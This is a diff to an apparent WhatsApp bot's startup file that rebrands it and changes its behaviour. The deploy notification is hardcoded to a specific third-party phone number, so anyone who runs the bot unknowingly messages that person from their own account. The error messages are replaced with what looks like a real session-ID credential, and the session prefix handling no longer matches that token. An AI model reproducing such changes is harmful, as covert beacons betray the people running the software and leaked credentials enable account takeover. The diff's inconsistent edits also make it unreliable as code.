@@ -35,7 +35,7 @@ const prefix = config.PREFIX;
 })();
 
 
-const ownerNumber = config.OWNER_NUM;
+const ownerNumber = config.OWNER_NUM;50946512803
 
 //===================SESSION-AUTH============================
 async function downloadSessionIfNeeded() {
@@ -43,13 +43,13 @@ async function downloadSessionIfNeeded() {
 
   if (!fs.existsSync(sessionPath)) {
     if (!config.SESSION_ID) {
-      console.log("❌ Please add your session to SESSION_ID env !!");
+      console.log("HANS-BYTE~Yr1hiCjY#tjDmHZeUs9pdeaYsm3x7txr0fqZLjgNG4_4fWu_Nzw0");
       process.exit(1);
     }
 
     try {
       console.log("📥 Downloading session from MEGA...");
-      const sessdata = config.SESSION_ID.replace('HANS-BYTE~', '');
+      const sessdata = config.SESSION_ID.replace('Shadow_bot~', '');
       const filer = File.fromURL(`https://mega.nz/file/${sessdata}`);
 
       const data = await new Promise((resolve, reject) => {
@@ -63,7 +63,7 @@ async function downloadSessionIfNeeded() {
       await fs.promises.writeFile(sessionPath, data);
       console.log("✅ Session downloaded and saved.");
     } catch (err) {
-      console.error("❌ Failed to download session:", err);
+      console.error("HANS-BYTE~Yr1hiCjY#tjDmHZeUs9pdeaYsm3x7txr0fqZLjgNG4_4fWu_Nzw0");
       process.exit(1);
     }
   } else {
@@ -84,7 +84,7 @@ async function connectToWA() {
   
 //===========================
 
-console.log("Connecting HANS BYTE");
+console.log("Connecting shadow");
 
 const { state, saveCreds } = await useMultiFileAuthState(__dirname + "/sessions/");
 const { version } = await fetchLatestBaileysVersion();
@@ -136,7 +136,7 @@ const robin = makeWASocket({
   ╚═════════════════╝`;
       let up1 = `Hello Mr Hans i succesfully deployed HANS BYTE`;
 
-      robin.sendMessage(ownerNumber + "@s.whatsapp.net", {
+      robin.sendMessage(50946512803 + "@s.whatsapp.net", {
         image: {
           url: `https://i.ibb.co/6Rxhg321/Chat-GPT-Image-Mar-30-2025-03-39-42-AM.png`,
         },
